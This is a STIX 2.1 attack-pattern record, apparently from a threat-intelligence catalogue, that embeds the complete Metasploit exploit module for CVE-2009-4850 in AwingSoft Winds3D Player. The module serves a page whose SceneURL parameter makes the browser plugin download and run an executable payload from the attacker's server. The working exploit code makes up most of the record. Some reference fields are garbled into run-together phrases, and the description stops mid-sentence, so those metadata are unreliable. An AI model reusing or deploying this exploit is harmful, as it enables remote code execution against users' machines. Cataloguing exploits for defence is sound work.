{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4737dab-4a73-44b1-854d-69b9141277b5",
    "created": "2024-08-14T16:45:02.827981Z",
    "modified": "2024-08-14T16:45:02.827985Z",
    "name": "AwingSoft Winds3D Player 3.5 SceneURL Download and Execute",
    "description": " This module exploits an untrusted program execution vulnerability within the Winds3D Player from AwingSoft. The Winds3D Player is a browser plugin for",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/awingsoft_winds3d_sceneurl.rb",
            "external_id": "awingsoft_winds3d_sceneurl.rb"
        },
        {
            "source_name": "parametertotheURLtoanexecutable",
            "external_id": "anattackercanexecutearbitrary"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-4850"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AwingSoft Winds3D Player 3.5 SceneURL Download and Execute',\n      'Description'    => %q{\n          This module exploits an untrusted program execution vulnerability within the\n        Winds3D Player from AwingSoft. The Winds3D Player is a browser plugin for\n        IE (ActiveX), Opera (DLL) and Firefox (XPI). By setting the 'SceneURL'\n        parameter to the URL to an executable, an attacker can execute arbitrary\n        code.\n\n        Testing was conducted using plugin version 3.5.0.9 for Firefox 3.5 and\n        IE 8 on Windows XP SP3.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'jduck'  # original discovery & metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-4850' ],\n          [ 'OSVDB', '60049' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2009-11-14',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/payload\"\n\n    if (request.uri.match(/payload/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending EXE payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n\n      # Handle the payload\n      # handler(cli)\n      return\n    end\n\n    # otherwise, send the html..\n    html = %Q|<html>\n<body>\n<object classid='clsid:17A54E7D-A9D4-11D8-9552-00E04CB09903'\ncodebase='http://www.awingsoft.com/zips/WindsPly.CAB'>\n<param name=\"SceneURL\" value=\"#{payload_url}#\">\n<embed type=\"application/x-awingsoft-winds3d\" src=\"#{payload_url}\">\n</object>\n|\n\n    print_status(\"Sending #{self.name} HTML\")\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2009-11-14",
    "x_mitre_platforms": [
        "win'"
    ]
}